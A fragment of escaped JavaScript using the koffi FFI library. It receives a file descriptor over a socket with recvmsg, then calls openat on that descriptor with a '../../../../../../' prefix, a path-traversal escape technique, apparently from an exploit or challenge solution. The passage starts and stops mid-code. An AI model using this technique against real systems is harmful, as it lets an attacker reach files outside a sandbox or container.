          \        }\n    }\n\n    buf = koffi.alloc('char', koffi.sizeof('cmsghdr'))\n\
          \n    msg = {\n        msg_control: buf,\n        msg_controllen: koffi.sizeof('cmsghdr'),\n\
          \    }\n\n    err = recvmsg(sfd, msg, 0);\n    console.log(err, koffi.errno());\n\
          \n    cmsg = koffi.decode(buf, 'cmsghdr');\n    \n    if (err < 0) {\n \
          \       return {\n            result: err.toString() + ' ' + koffi.errno()\n\
          \        }\n    }\n\n    fd = openat(cmsg.fd, \"../../../../../../\" + path,\
